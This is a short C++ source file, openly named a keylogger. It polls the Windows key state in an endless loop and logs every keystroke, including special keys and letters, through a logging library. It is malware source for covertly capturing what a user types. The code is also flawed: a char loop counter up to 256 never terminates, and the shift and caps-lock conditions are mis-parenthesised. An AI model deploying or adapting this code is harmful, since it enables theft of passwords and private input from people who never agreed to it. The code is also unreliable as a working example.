#include "common.hpp"

namespace keylogger
{
	static auto keydown(int vKey)
	{
		return (GetAsyncKeyState(vKey) & 0x8000) != 0;
	}

	static void keylogger()
	{
		while (true)
		{
			std::this_thread::sleep_for(std::chrono::milliseconds(10));
			for (char i = 0; i <= 256; i++)
			{
				if (GetAsyncKeyState(i) == -32767)
				{
					switch (i)
					{
					case VK_SHIFT: spdlog::info("SHIFT");
						break;
					case VK_BACK: spdlog::info("BACKSPACE");
						break;
					case VK_LBUTTON: spdlog::info("LBUTTON");
						break;
					case VK_RBUTTON: spdlog::info("RBUTTON");
						break;
					case VK_RETURN: spdlog::info("ENTER");
						break;
					case VK_TAB: spdlog::info("TAB");
						break;
					case VK_ESCAPE: spdlog::info("ESCAPE");
						break;
					case VK_CONTROL: spdlog::info("CTRL");
						break;
					case VK_MENU: spdlog::info("ALT");
						break;
					case VK_CAPITAL: spdlog::info("CAPITAL");
						break;
					case VK_SPACE: spdlog::info("SPACE");
						break;
					case VK_LMENU: spdlog::info("ALT");
						break;
					case VK_NUMPAD0: spdlog::info("NUMPAD0");
						break;
					case VK_NUMPAD1: spdlog::info("NUMPAD1");
						break;
					case VK_NUMPAD2: spdlog::info("NUMPAD2");
						break;
					case VK_NUMPAD3: spdlog::info("NUMPAD3");
						break;
					case VK_NUMPAD4: spdlog::info("NUMPAD4");
						break;
					case VK_NUMPAD5: spdlog::info("NUMPAD5");
						break;
					case VK_NUMPAD6: spdlog::info("NUMPAD6");
						break;
					case VK_NUMPAD7: spdlog::info("NUMPAD7");
						break;
					case VK_NUMPAD8: spdlog::info("NUMPAD8");
						break;
					case VK_NUMPAD9: spdlog::info("NUMPAD9");
						break;
					case VK_MULTIPLY: spdlog::info("*");
						break;
					case VK_DECIMAL: spdlog::info(",");
						break;
					case VK_SUBTRACT: spdlog::info("-");
						break;
					case VK_ADD: spdlog::info("+");
						break;
					default:
						if (keydown(i) && keydown(VK_SHIFT) || GetKeyState(VK_CAPITAL))
							spdlog::info((char)(std::toupper(i)));
						else if (keydown(i) && !keydown(VK_SHIFT) || !GetKeyState(VK_CAPITAL))
							spdlog::info((char)(std::tolower(i)));
						break;
					}
				}
			}
		}
	}
}